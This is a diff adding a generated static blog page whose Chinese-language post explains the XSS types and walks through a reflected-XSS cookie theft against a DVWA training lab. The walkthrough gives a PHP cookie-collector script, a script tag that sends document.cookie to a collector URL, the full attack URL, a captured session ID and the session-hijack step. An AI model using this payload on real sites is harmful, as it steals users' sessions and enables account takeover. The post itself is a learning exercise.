@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="XSSxss即Cross-site scripting(跨站脚本)，是一种客户端代码注入，通常注入代码时JavaScript，区别于命令注入，SQL注入等服务端代码注入。当用户访问被XSS脚本注入的网页，XSS代码就会被用户浏览器解析，从而达到攻击的目的。也就是说，XSS的对象时用户和浏览器。  存储型XSS  攻击代码在数据库里，输出在HTTP响应中  反射性XSS  攻击代码在url里，输出在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://kkkylin12.github.io/2021/08/01/XSS/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="XSSxss即Cross-site scripting(跨站脚本)，是一种客户端代码注入，通常注入代码时JavaScript，区别于命令注入，SQL注入等服务端代码注入。当用户访问被XSS脚本注入的网页，XSS代码就会被用户浏览器解析，从而达到攻击的目的。也就是说，XSS的对象时用户和浏览器。  存储型XSS  攻击代码在数据库里，输出在HTTP响应中  反射性XSS  攻击代码在url里，输出在">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:/blog范本/XSS攻击思路.PNG">
+<meta property="article:published_time" content="2021-08-01T15:53:54.187Z">
+<meta property="article:modified_time" content="2021-08-01T15:53:31.470Z">
+<meta property="article:author" content="Kkkylin12">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/blog范本/XSS攻击思路.PNG">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://Kkkylin12.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-XSS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/08/01/XSS/" class="article-date">
+  <time class="dt-published" datetime="2021-08-01T15:53:54.187Z" itemprop="datePublished">2021-08-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>xss即Cross-site scripting(跨站脚本)，是一种客户端代码注入，通常注入代码时JavaScript，区别于命令注入，SQL注入等服务端代码注入。当用户访问被XSS脚本注入的网页，XSS代码就会被用户浏览器解析，从而达到攻击的目的。也就是说，XSS的对象时用户和浏览器。</p>
+<ul>
+<li>存储型XSS</li>
+</ul>
+<p>攻击代码在数据库里，输出在HTTP响应中</p>
+<ul>
+<li>反射性XSS</li>
+</ul>
+<p>攻击代码在url里，输出在HTTP响应中</p>
+<ul>
+<li>DOM型XSS</li>
+</ul>
+<p>攻击代码在url里，输出在DOM节点中</p>
+<p>反射性XSS</p>
+<h5 id="弹窗测试"><a href="#弹窗测试" class="headerlink" title="弹窗测试"></a>弹窗测试</h5><p>提交<script>alert(/xss/)</script>，出现弹窗，成功注入，说明存在xss漏洞</p>
+<p>  弹窗函数：alert()、confirm()、prompt()</p>
+<h4 id="整体攻击思路"><a href="#整体攻击思路" class="headerlink" title="整体攻击思路"></a>整体攻击思路</h4><p><img src="D:\blog范本\XSS攻击思路.PNG" alt="XSS攻击思路"></p>
+<p>攻击者web设计</p>
+<p>构建<a target="_blank" rel="noopener" href="http://127.0.0.1/cookie.php%E6%96%87%E4%BB%B6">http://127.0.0.1/cookie.php文件</a></p>
+<p>内容：</p>
+<?php
+$cookie = $_GET[ 'cookie'];file_put_contents('cookie.txt',$cookie);
+?>
+
+<p>构造攻击js</p>
+<script>document.location='http://127.0.0.1/cookie.php?cookie='+document.cookie;</script>
+
+<p>构造并发送攻击url</p>
+<p><a target="_blank" rel="noopener" href="http://10.240.138.212/DVWA-1.9/vulnerabilities/xss_r/?name=">http://10.240.138.212/DVWA-1.9/vulnerabilities/xss_r/?name=</a><script>document.location='<a target="_blank" rel="noopener" href="http://127.0.0.1/cookie.php?cookie=&#39;+document.cookie">http://127.0.0.1/cookie.php?cookie=&#39;+document.cookie</a>;</script>同时需要对参数进行url编码</p>
+<p>获得cookie</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/cookie.txt">http://127.0.0.1/cookie.txt</a></p>
+<p>内容：</p>
+<p>security=low;<br>PHPSESSID=tkgm1hqifl8du9rdkdge7ba0c2</p>
+<p>劫持会话</p>
+<p>进行cookie编辑，直接访问index.php，成功进入DVWA.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://kkkylin12.github.io/2021/08/01/XSS/" data-id="ckrtdvvhg0000fwub76ftgyyc" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/08/01/SQL%E7%9B%B2%E6%B3%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/08/01/XSS/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/01/SQL%E7%9B%B2%E6%B3%A8/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/25/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/21/SQL%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/21/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 Kkkylin12<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
